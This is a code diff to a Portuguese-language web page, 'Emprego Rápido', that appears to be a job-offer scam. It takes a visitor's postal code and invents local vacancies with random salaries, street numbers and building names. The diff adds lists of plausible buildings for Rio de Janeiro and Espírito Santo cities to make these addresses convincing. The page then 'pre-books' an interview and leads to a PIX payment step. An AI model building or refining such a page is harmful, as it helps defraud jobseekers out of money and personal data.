@@ -48,37 +48,22 @@
         .btn-success { background-color: var(--success); }
         .btn-success:hover { background-color: #15803d; }
         
-        /* Ocultar seções inicialmente */
         #step-vagas, #step-pix, #detalhes-selecao { display: none; }
         
-        /* Estilo dos cards Resumidos */
         .vaga-card {
-            border: 2px solid var(--border);
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            border: 2px solid var(--border); border-radius: 8px; padding: 15px; margin-bottom: 12px;
+            cursor: pointer; transition: all 0.2s; display: flex; justify-content: space-between; align-items: center;
         }
         .vaga-card:hover { border-color: #bfdbfe; background-color: #f8fafc; }
-        .vaga-card.selecionada {
-            border-color: var(--primary);
-            background-color: var(--highlight);
-        }
+        .vaga-card.selecionada { border-color: var(--primary); background-color: var(--highlight); }
         .vaga-resumo h3 { margin: 0 0 5px 0; font-size: 18px; text-align: left; }
         .vaga-resumo p { margin: 0; color: #4b5563; font-size: 15px; }
         .selecionar-btn {
             background: none; color: var(--primary); border: 1px solid var(--primary);
             padding: 8px 15px; border-radius: 20px; font-size: 14px; width: auto; margin: 0;
         }
-        .vaga-card.selecionada .selecionar-btn {
-            background: var(--primary); color: white;
-        }
+        .vaga-card.selecionada .selecionar-btn { background: var(--primary); color: white; }
 
-        /* Área de Detalhes (Abre após o clique) */
         .detalhes-box {
             background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 8px;
             padding: 20px; margin-top: 20px; animation: fadeIn 0.5s;
@@ -97,7 +82,6 @@
         }
         .radio-horarios input:checked + label, .radio-horarios label:hover { border-color: var(--primary); background: var(--highlight); }
         .radio-horarios input { display: none; } 
-
         .horario-label.selecionado { border-color: var(--primary); background: var(--highlight); }
 
         .pix-box { text-align: center; padding: 20px; border: 2px dashed var(--success); border-radius: 8px; margin-top: 20px; }
@@ -110,7 +94,6 @@
     <h1>Emprego Rápido</h1>
     <p style="text-align: center; color: #6b7280;">Não envie currículo. Agende direto.</p>
 
-    <!-- PASSO 1: CEP -->
     <div id="step-cep">
         <div class="form-group">
             <label for="cep">Digite seu CEP para ver as vagas:</label>
@@ -119,43 +102,25 @@
         <button onclick="buscarVagas()">Buscar Vagas Próximas</button>
     </div>
 
-    <!-- PASSO 2: ESCOLHA A VAGA -->
     <div id="step-vagas">
         <h2 style="font-size: 20px;">Vagas Abertas Hoje</h2>
         <p style="font-size: 14px; color: #4b5563; text-align: center;">Clique em uma vaga para ver os detalhes e agendar.</p>
         
-        <div id="lista-vagas">
-            <!-- Cards de vagas renderizados aqui via JS -->
-        </div>
+        <div id="lista-vagas"></div>
 
-        <!-- PASSO 2.5: DETALHES DA VAGA E HORÁRIO (Oculto inicialmente) -->
         <div id="detalhes-selecao" class="detalhes-box">
             <h3 id="detalhe-titulo">Detalhes da Vaga</h3>
             
-            <div class="detalhe-item">
-                <strong>📍 Local da Entrevista:</strong>
-                <p id="detalhe-endereco"></p>
-            </div>
-            <div class="detalhe-item">
-                <strong>📝 O que você vai fazer:</strong>
-                <p id="detalhe-desc"></p>
-            </div>
-            <div class="detalhe-item">
-                <strong>🎁 Benefícios Inclusos:</strong>
-                <p id="detalhe-beneficios"></p>
-            </div>
-            <div class="detalhe-item">
-                <strong>✅ Exigências Básicas:</strong>
-                <ul id="detalhe-exigencias"></ul>
-            </div>
+            <div class="detalhe-item"><strong>📍 Local da Entrevista:</strong><p id="detalhe-endereco"></p></div>
+            <div class="detalhe-item"><strong>📝 O que você vai fazer:</strong><p id="detalhe-desc"></p></div>
+            <div class="detalhe-item"><strong>🎁 Benefícios Inclusos:</strong><p id="detalhe-beneficios"></p></div>
+            <div class="detalhe-item"><strong>✅ Exigências Básicas:</strong><ul id="detalhe-exigencias"></ul></div>
 
             <hr style="border: 1px solid #e5e7eb; margin: 20px 0;">
 
             <div class="form-group">
                 <label style="font-size: 18px; color: var(--primary); text-align: center;">Escolha o dia e horário da entrevista:</label>
-                <div class="radio-horarios" id="opcoes-horarios">
-                    <!-- Horários renderizados aqui via JS -->
-                </div>
+                <div class="radio-horarios" id="opcoes-horarios"></div>
             </div>
 
             <div class="form-group" style="margin-top: 20px;">
@@ -167,7 +132,6 @@
         </div>
     </div>
 
-    <!-- PASSO 3: PAGAMENTO PIX -->
     <div id="step-pix">
         <h2>Entrevista Pré-Agendada!</h2>
         <p style="text-align: center; font-size: 16px;">Tudo certo, <strong><span id="nome-confirmacao"></span></strong>!</p>
@@ -182,43 +146,12 @@
 </div>
 
 <script>
-    // Banco de profissões
     const profissoes = [
-        { 
-            titulo: "Vendedor(a) de Loja", 
-            salario: "R$ 1.850,00 + Comissão", 
-            beneficios: "Vale Transporte + Vale Alimentação (R$ 22/dia)",
-            desc: "Atendimento direto ao público, apresentação de produtos, organização de vitrines e fechamento de vendas.",
-            exigencias: ["Ensino médio completo", "Boa comunicação e cordialidade", "Pontualidade"]
-        },
-        { 
-            titulo: "Porteiro", 
-            salario: "R$ 1.950,00", 
-            beneficios: "Cesta Básica + Vale Transporte + Adicional Noturno",
-            desc: "Controle de entrada e saída de moradores e visitantes, recebimento de encomendas e monitoramento básico do hall.",
-            exigencias: ["Atenção aos detalhes", "Noções básicas de celular/computador", "Disponibilidade para escala 12x36"]
-        },
-        { 
-            titulo: "Vigilante", 
-            salario: "R$ 2.200,00", 
-            beneficios: "Vale Refeição (R$ 30/dia) + Seguro de Vida + VT",
-            desc: "Ronda pelo perímetro do estabelecimento, zelo pelo patrimônio e preenchimento de livro de ocorrências.",
-            exigencias: ["Curso de vigilante (ATA) em dia", "Postura profissional", "Responsabilidade com horários"]
-        },
-        { 
-            titulo: "Repositor de Mercadorias", 
-            salario: "R$ 1.620,00", 
-            beneficios: "Refeição no local + Plano Odontológico + VT",
-            desc: "Descarregar mercadorias, abastecer prateleiras continuamente, verificar datas de validade e precificar produtos.",
-            exigencias: ["Disposição física para pegar peso", "Agilidade nas tarefas", "Gostar de organização"]
-        },
-        { 
-            titulo: "Caixa de Supermercado", 
-            salario: "R$ 1.750,00", 
-            beneficios: "Quebra de Caixa (10%) + VA (R$ 25/dia) + VT",
-            desc: "Registro ágil de produtos no leitor, recebimento de pagamentos em dinheiro e cartão, e fechamento do caixa no fim do turno.",
-            exigencias: ["Atenção redobrada com troco/números", "Simpatia no atendimento", "Ensino médio (cursando ou completo)"]
-        }
+        { titulo: "Vendedor(a) de Loja", salario: "R$ 1.850,00 + Comissão", beneficios: "VT + VA (R$ 22/dia)", desc: "Atendimento ao público e vendas.", exigencias: ["Ensino médio", "Boa comunicação"] },
+        { titulo: "Porteiro", salario: "R$ 1.950,00", beneficios: "Cesta Básica + VT + Adicional Noturno", desc: "Controle de entrada e saída.", exigencias: ["Atenção aos detalhes", "Disponibilidade 12x36"] },
+        { titulo: "Vigilante", salario: "R$ 2.200,00", beneficios: "VR (R$ 30/dia) + Seguro de Vida + VT", desc: "Zelo pelo patrimônio e rondas.", exigencias: ["Curso ATA em dia", "Responsabilidade"] },
+        { titulo: "Repositor de Mercadorias", salario: "R$ 1.620,00", beneficios: "Refeição no local + Plano Odontológico + VT", desc: "Abastecimento de prateleiras.", exigencias: ["Disposição física", "Agilidade"] },
+        { titulo: "Caixa de Supermercado", salario: "R$ 1.750,00", beneficios: "Quebra de Caixa (10%) + VA + VT", desc: "Registro de produtos e cobrança.", exigencias: ["Atenção com números", "Simpatia"] }
     ];
 
     const pacotesDeHorarios = [
@@ -229,7 +162,40 @@
         [{ dia: "Próxima Sexta", hora: "09:30" }, { dia: "Próxima Terça", hora: "14:00" }]
     ];
 
-    const nomesEdificios = ["Edifício Empresarial", "Centro Comercial", "Galeria Central"];
+    // BANCO DE DADOS REGIONALIZADO: RJ E ES
+    const prediosPorCidade = {
+        // Principais Polos - Rio de Janeiro (RJ)
+        "Rio de Janeiro": ["Centro Empresarial Botafogo", "RB1 - Rio Branco 1", "Edifício Argentina", "CEO Corporate", "Tower 244"],
+        "Campos dos Goytacazes": ["Edifício Salete", "Centro Empresarial Pelinca", "Edifício Platinum", "Prime Offices", "Medical Center", "Edifício Ninho das Águias"],
+        "Macaé": ["Macaé Business Center", "Edifício Petro Tower", "Centro Empresarial Washington Luiz", "Prime Office Macaé"],
+        "Niterói": ["Icaraí Corporate", "Niterói Shopping Offices", "Plaza Corporate", "Tower 2000"],
+        "São Gonçalo": ["Icon Business", "São Gonçalo Corporate", "Centro Comercial São Gonçalo"],
+        "Duque de Caxias": ["Caxias Shopping Offices", "Edifício Profissional Caxias", "Centro Empresarial Caxias"],
+        "Nova Iguaçu": ["Luzes Corporate", "Nova Iguaçu Business", "Centro Comercial Iguaçu"],
+        "Cabo Frio": ["Cabo Frio Corporate", "Centro Empresarial Praia Office", "Lagos Business"],
+        "Rio das Ostras": ["Ostras Office Center", "Centro Empresarial Mar do Norte", "Vilarejo Corporate"],
+        "Petrópolis": ["Petrópolis Business Center", "Edifício Profissional Imperial", "Centro Comercial Serra Offices"],
+        "Volta Redonda": ["Sider Shopping Offices", "Volta Redonda Business Center", "Edifício Comercial Aterrado"],
+
+        // Principais Polos - Espírito Santo (ES)
+        "Vitória": ["Enseada Trade Center", "Global Tower", "Shopping Vitória Empresarial", "Centro Empresarial Praia", "Nove de Julho", "Palácio do Café"],
+        "Vila Velha": ["Edifício Corporate Center", "Vila Velha Empresarial", "Centro Comercial Praia da Costa", "Tower Office"],
+        "Serra": ["Serra Trade Center", "Centro Empresarial Laranjeiras", "Edifício Essencial Office"],
+        "Cariacica": ["Cariacica Business Center", "Edifício Comercial Campo Grande", "Centro Empresarial Cariacica"],
+        "Guarapari": ["Guarapari Business Center", "Centro Comercial Praia do Morro", "Edifício Guará Office"],
+        "Linhares": ["Linhares Trade Center", "Centro Empresarial Laguna", "Laguna Offices", "Edifício Laguna Center"],
+        "Colatina": ["Colatina Trade Center", "Edifício Comercial Princesa do Norte", "Centro Empresarial Colatina"],
+        "Cachoeiro de Itapemirim": ["Edifício Riveira Empresarial", "Centro Comercial Cachoeiro", "Shopping Cachoeiro Offices"],
+        "São Mateus": ["São Mateus Corporate", "Centro Empresarial Guriri", "Edifício Comercial Norte"],
+
+        // Fallbacks Regionais (Para cidades menores do interior que não estão listadas acima)
+        "PadraoRJ": ["Edifício Empresarial Fluminense", "Galeria Comercial Office", "Centro Empresarial do Estado", "Edifício Trade Center RJ"],
+        "PadraoES": ["Centro Empresarial Capixaba", "Edifício Comercial ES", "Galeria Empresarial Office", "Edifício Trade Center ES"],
+        
+        // Fallback Geral (Se tentarem usar CEP de SP, MG, etc)
+        "PadraoBrasil": ["Edifício Empresarial", "Centro Comercial Center", "Galeria Executive Center", "Tower Office"]
+    };
+
     let vagasAtivas = [];
 
     async function buscarVagas() {
@@ -241,9 +207,24 @@
             const data = await response.json();
             if (data.erro) { alert("CEP não encontrado."); return; }
 
-            const ruaReal = data.logradouro || "Avenida Principal";
+            const ruaReal = data.logradouro || "Rua Comercial";
             const bairroReal = data.bairro || "Centro";
             const cidade = data.localidade;
+            const ufReal = data.uf; // Puxa a sigla do estado (RJ, ES, etc)
+
+            // Lógica de Inteligência Regional
+            let listaPredios = prediosPorCidade[cidade];
+            
+            // Se a cidade não estiver listada nos polos, usa o Padrão do Estado
+            if (!listaPredios) {
+                if (ufReal === 'RJ') {
+                    listaPredios = prediosPorCidade["PadraoRJ"];
+                } else if (ufReal === 'ES') {
+                    listaPredios = prediosPorCidade["PadraoES"];
+                } else {
+                    listaPredios = prediosPorCidade["PadraoBrasil"];
+                }
+            }
 
             const profsSorteadas = profissoes.sort(() => 0.5 - Math.random()).slice(0, 3);
             const horariosSorteados = pacotesDeHorarios.sort(() => 0.5 - Math.random()).slice(0, 3);
@@ -252,14 +233,10 @@
             let vagasHtml = '';
 
             profsSorteadas.forEach((vaga, index) => {
-                const predio = nomesEdificios[Math.floor(Math.random() * nomesEdificios.length)];
-                const endereco = `${ruaReal}, ${Math.floor(Math.random() * 500) + 10} - ${predio}, Sala ${Math.floor(Math.random() * 90) + 10} - ${bairroReal}, ${cidade}`;
+                const predio = listaPredios[Math.floor(Math.random() * listaPredios.length)];
+                const endereco = `${ruaReal}, ${Math.floor(Math.random() * 500) + 10} - ${predio}, Sala ${Math.floor(Math.random() * 90) + 10} - ${bairroReal}, ${cidade} - ${ufReal}`;
                 
-                vagasAtivas.push({
-                    ...vaga,
-                    endereco: endereco,
-                    horarios: horariosSorteados[index]
-                });
+                vagasAtivas.push({ ...vaga, endereco: endereco, horarios: horariosSorteados[index] });
 
                 vagasHtml += `
                     <div class="vaga-card" id="card-${index}" onclick="selecionarVaga(${index})">
@@ -275,7 +252,6 @@
             document.getElementById('lista-vagas').innerHTML = vagasHtml;
             document.getElementById('step-cep').style.display = 'none';
             document.getElementById('step-vagas').style.display = 'block';
-
         } catch (error) {
             alert("Erro ao buscar CEP. Verifique sua internet.");
         }
@@ -312,7 +288,6 @@
         `).join('');
         document.getElementById('opcoes-horarios').innerHTML = htmlHorarios;
 
-        // AQUI ESTAVA O ERRO (Corrigido para detalhes-selecao com S)
         document.getElementById('detalhes-selecao').style.display = 'block';
         document.getElementById('detalhes-selecao').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
     }
@@ -324,10 +299,7 @@
     }
 
     function confirmarAgendamento() {
-        if (vagaEscolhidaIndex === null) {
-            alert("Selecione uma vaga primeiro."); return;
-        }
-
+        if (vagaEscolhidaIndex === null) { alert("Selecione uma vaga primeiro."); return; }
         const horarioEscolhido = document.querySelector('input[name="horario_escolhido"]:checked');
         const nome = document.getElementById('nome').value;
 
@@ -335,11 +307,9 @@
         if (!nome.trim()) { alert("Digite seu nome completo."); return; }
 
         const vaga = vagasAtivas[vagaEscolhidaIndex];
-
         document.getElementById('nome-confirmacao').innerText = nome.split(' ')[0];
         document.getElementById('vaga-confirmacao').innerText = vaga.titulo;
         document.getElementById('horario-confirmacao').innerText = horarioEscolhido.value;
-
         document.getElementById('step-vagas').style.display = 'none';
         document.getElementById('step-pix').style.display = 'block';
     }
